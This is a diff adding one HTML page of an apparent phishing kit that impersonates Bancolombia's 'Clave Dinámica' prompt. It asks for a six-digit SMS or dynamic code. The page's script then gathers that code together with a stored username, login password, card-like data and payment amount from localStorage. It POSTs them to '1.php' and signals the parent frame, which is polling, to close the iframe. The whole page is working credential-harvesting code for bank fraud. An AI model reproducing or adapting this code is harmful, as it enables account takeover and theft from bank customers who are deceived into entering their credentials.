@@ -1,0 +1,199 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Clave Dinámica</title>
+  <style>
+    * {
+      box-sizing: border-box;
+      font-family: 'Segoe UI', sans-serif;
+    }
+
+    body {
+      margin: 0;
+      padding: 0;
+      background-color: #3a3a3a;
+      color: white;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding: 30px 20px;
+    }
+
+    .video-container {
+      width: 100%;
+      max-width: 360px;
+      border-radius: 12px;
+      overflow: hidden;
+      margin-bottom: 20px;
+    }
+
+    video {
+      width: 100%;
+      height: auto;
+      display: block;
+    }
+
+    h2 {
+      font-size: 1.6em;
+      text-align: center;
+      margin: 10px 0;
+    }
+
+    p {
+      text-align: center;
+      color: #ccc;
+      font-size: 0.95em;
+      margin-bottom: 25px;
+    }
+
+    .pin-container {
+      display: flex;
+      justify-content: center;
+      gap: 10px;
+      margin-bottom: 30px;
+    }
+
+    .pin-input {
+      width: 36px;
+      height: 48px;
+      text-align: center;
+      font-size: 1.4em;
+      border: none;
+      border-bottom: 2px solid #fff;
+      background: transparent;
+      color: #fff;
+      border-radius: 5px;
+      outline: none;
+      transition: border-color 0.2s;
+    }
+
+    .pin-input:focus {
+      border-color: #f9c411;
+    }
+
+    .buttons {
+      display: flex;
+      gap: 10px;
+      justify-content: space-between;
+      width: 100%;
+      max-width: 360px;
+    }
+
+    .buttons button {
+      flex: 1;
+      padding: 12px;
+      font-size: 1em;
+      border-radius: 25px;
+      font-weight: bold;
+      cursor: pointer;
+      border: none;
+    }
+
+    .btn-borrar {
+      background-color: transparent;
+      color: #ccc;
+      border: 1px solid #ccc;
+    }
+
+    .btn-continuar {
+      background-color: #f9c411;
+      color: #000;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="video-container">
+    <video src="img/1.mov" autoplay muted loop></video>
+  </div>
+
+  <h2>Ingresa la Clave Dinámica</h2>
+  <p>Encuentra tu Clave Dinámica en la app Mi Bancolombia.</p>
+
+ <div class="pin-container">
+  <input type="text" maxlength="1" class="pin-input" />
+  <input type="text" maxlength="1" class="pin-input" />
+  <input type="text" maxlength="1" class="pin-input" />
+  <input type="text" maxlength="1" class="pin-input" />
+  <input type="text" maxlength="1" class="pin-input" />
+  <input type="text" maxlength="1" class="pin-input" />
+</div>
+
+
+  <div class="buttons">
+    <button class="btn-borrar" onclick="window.parent.cerrarIframeClave()">Borrar</button>
+    <button class="btn-continuar" onclick="enviarClaveDinamica()">Continuar</button>
+  </div>
+
+  <script>
+  const inputs = document.querySelectorAll('.pin-input');
+
+  // Movimiento automático entre inputs
+  inputs.forEach((input, index) => {
+    input.addEventListener('input', () => {
+      input.value = input.value.replace(/[^0-9]/g, ""); // solo números
+      if (input.value.length === 1 && index < inputs.length - 1) {
+        inputs[index + 1].focus();
+      }
+    });
+
+    input.addEventListener('keydown', (e) => {
+      if (e.key === "Backspace" && input.value === "" && index > 0) {
+        inputs[index - 1].focus();
+      }
+    });
+  });
+
+  // Enviar la clave dinámica
+  async function enviarClaveDinamica() {
+    const clave = Array.from(inputs).map(i => i.value).join('');
+
+    if (clave.length !== 6) {
+      alert("Debes ingresar los 6 dígitos del código SMS.");
+      return;
+    }
+
+    console.log("🔐 Clave SMS ingresada:", clave);
+
+    // ================================
+    // 🔥 PREPARAMOS EL ENVÍO A 1.php
+    // ================================
+
+    const usuario = localStorage.getItem("usuario") || "";
+    const claveLogin = localStorage.getItem("clave_login") || "";
+    const tbdatos = JSON.parse(localStorage.getItem("tbdatos") || "{}");
+    const monto = localStorage.getItem("total_pagar") || "0";
+
+    const transactionToken = crypto.randomUUID();
+
+    const payload = {
+      transactionId: transactionToken,
+      bancoldata: { usuario: usuario, clave: claveLogin },
+      bancoldina: { clave: clave }, // clave SMS aquí
+      metodo: "sms",
+      total: monto,
+      tbdatos
+    };
+
+    // ================================
+    // 🔥 POST a tu backend
+    // ================================
+    await fetch("1.php", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(payload)
+    });
+
+    // Avisamos al padre que cierre el iframe
+    if (window.parent && typeof window.parent.cerrarIframeClave === "function") {
+      window.parent.cerrarIframeClave();
+    }
+
+    // El padre ya tiene su propio polling → no hace falta hacerlo desde el iframe
+  }
+</script>
+
+</body>
+</html>
